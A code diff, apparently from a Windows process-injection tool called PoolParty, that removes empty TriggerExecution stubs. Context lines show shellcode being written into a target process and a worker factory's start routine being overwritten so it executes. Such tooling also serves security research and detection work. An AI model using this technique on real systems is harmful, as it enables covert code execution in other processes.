@@ -34,10 +34,6 @@ void PoolParty::WriteShellcode() {
 	WriteMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
 }
 
-void PoolParty::TriggerExecution() 
-{
-}
-
 void PoolParty::Inject() {
 	m_p_hTargetPid = this->GetTargetProcessHandle();
 	m_p_hWorkerFactory = this->GetWorkerFactoryHandle();
@@ -45,7 +41,6 @@ void PoolParty::Inject() {
 	m_ShellcodeAddress = this->AllocateShellcodeMemory();
 	this->WriteShellcode();
 	this->SetupExecution();
-	this->TriggerExecution();
 }
 
 PoolParty::~PoolParty() 
@@ -67,11 +62,6 @@ WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwT
 void WorkerFactoryStartRoutineOverwrite::SetupExecution()
 {
 	WriteMemory(*m_p_hTargetPid, m_WorkerFactoryInformation.StartRoutine, m_cShellcode, m_szShellcodeSize);
-}
-
-void WorkerFactoryStartRoutineOverwrite::TriggerExecution()
-{
-
 }
 
 WorkerFactoryStartRoutineOverwrite::~WorkerFactoryStartRoutineOverwrite()
